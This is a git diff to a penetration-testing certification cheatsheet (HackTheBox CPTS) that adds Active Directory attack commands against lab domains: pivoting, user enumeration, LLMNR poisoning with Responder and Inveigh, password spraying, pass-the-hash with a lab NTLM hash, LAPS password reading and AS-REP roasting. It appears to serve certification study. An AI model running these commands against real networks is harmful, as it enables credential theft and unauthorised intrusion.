@@ -65,6 +65,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [RDP and SOCKS Tunneling with SocksOverRDP](#RDP-and-SOCKS-Tunneling-with-SocksOverRDP)
     - [Pivoting with ligolo-ng](#Pivoting-with-ligolo-ng)
 - [Active Directory](#active-directory)
+    - [Tools of the Trade](#Tools-of-the-Trade)
     - [Initial Enumeration](#initial-enumeration)
     - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
     - [Password Spraying & Password Policies](#password-spraying-and-password-policies)
@@ -1176,8 +1177,10 @@ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601       ( run in proxy)
 # setting to Access the Agent's own Localhost.
 sudo ip route add 240.0.0.1/32 dev1 ligolo                   ( run in hacer shell)
 
-# Command need to run  , ping and nmap in pivot 
+# Command need to run  , ping , fping and nmap in pivot 
 for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i | grep "from" & done
+
+fping -asgq 172.16.5.0/23
 
 nmap -sT -Pn --unprivileged --send-eth 172.16.6.45
 
@@ -1194,18 +1197,36 @@ sudo ip route add 172.16.6.0/24 dev ligolo2
 ```
 ## Active Directory
 
+#### Tools of the Trade
+```
+# List tool in hackthebox
+https://academy.hackthebox.com/module/143/section/1517
+```
 #### Initial Enumeration
 ```
+# Identify the servers holding the five FSMO (Flexible Single Master Operations) roles within an Active Directory (AD) Forest
+netdom query fsmo
+
 # Performs a ping sweep on the specified network segment from a Linux-based host
 fping -asgq 172.16.5.0/23
 
-# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
+# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.  
+sudo git clone https://github.com/ropnop/kerbrute.git
+sudo make all
 ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 ```
 ##### LLMNR Poisoning
 ```
-# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
+# LLMNR/NBT-NS Poisoning - from Linux
+sudo responder -I ens224 
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
+
+# LLMNR/NBT-NS Poisoning - from Windows (https://github.com/Kevin-Robertson/Inveigh)
+Import-Module .\Inveigh.ps1
+(Get-Command Invoke-Inveigh).Parameters
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+or
+.\Inveigh.exe
 ```
 ##### Password Spraying and Password Policies
 ```
@@ -1218,6 +1239,9 @@ rpcclient -U "" -N 172.16.5.5
 # Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
 rpcclient $> querydominfo
 
+# ses enum4linux-ng to enumerate the password policy (-P) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the -oA option.
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+
 # Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 
@@ -1225,7 +1249,11 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 
 net accounts
 
 # PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
+import-module .\PowerView.ps1
 Get-DomainPolicy
+
+# Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host.
+enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 # Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
 rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser
@@ -1236,14 +1264,29 @@ crackmapexec smb 172.16.5.5 --users
 # Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
 
+# Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner.
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+
 # Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
 
 # Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
 sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
-# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
+# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.  (https://github.com/dafthack/DomainPasswordSpray)
+Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+
+# Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host.  (https://github.com/ropnop/windapsearch)
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+# Used to enumerate the domain admins group (--da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.
+./windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+# Used to perform a recursive search (-PU) for users with nested permissions using valid credentials. Performed from a Linux-based host.
+./windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
 ```
 ##### [Enumerating and Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
 ```
@@ -1295,6 +1338,18 @@ Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 # PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.
+$ExecutionContext.SessionState.LanguageMode
+
+# A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.  (https://github.com/leoloobeek/LAPSToolkit)
+Find-LAPSDelegatedGroups
+
+# A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host.
+Find-AdmPwdExtendedRights
+
+# A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.
+Get-LAPSComputers
 ```
 ##### Living Of The Land
 ```
@@ -1312,6 +1367,9 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 
 # PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
 Get-ADTrust -Filter * | select name
+
+# PowerShell cmd-let used to search for a specifc group (-Identity "Backup Operators"). Performed from a Windows-based host.
+Get-ADGroup -Identity "Backup Operators"
 
 # PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
 Get-ADGroupMember -Identity "Backup Operators"
@@ -1589,8 +1647,11 @@ sudo cp krb5.conf /etc/krb5.conf
 # list users 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --users
 
-# list shares 
-netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
+# Enumerating Logged-on users.
+netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+
+# list groups 
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --groups
 
 # Get Password Policy info
 netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --pass-pol
@@ -1598,8 +1659,11 @@ netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --pass-pol
 # Get description info 
 netexec ldap dc01.fluffy.htb -u '' -p '' --query "(description=*)" description
 
-# Enumerating Logged-on users.
-netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+# list shares 
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
+
+# using module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M spider_plus --share Dev-share
 
 # AS-REP Roasting ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack ) 
 netexec ldap dc01.fluffy.htb -u '' -p '' --asreproast output.txt
@@ -1624,6 +1688,9 @@ netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --no-bruteforce --continue-o
 
 # try auth with user and pass in 2 file  
 netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --continue-on-success
+
+# Password Spraying
+netexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
 # p.agila can read the LAPS password from the ms-MCS-AdmPwd property  ( p.agila need have   ReadLAPSPassword permission) 
 netexec smb dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --laps --ntds
@@ -1991,4 +2058,6 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 
 [Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)
 
-[Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries)
+[Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries) 
+
+[BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
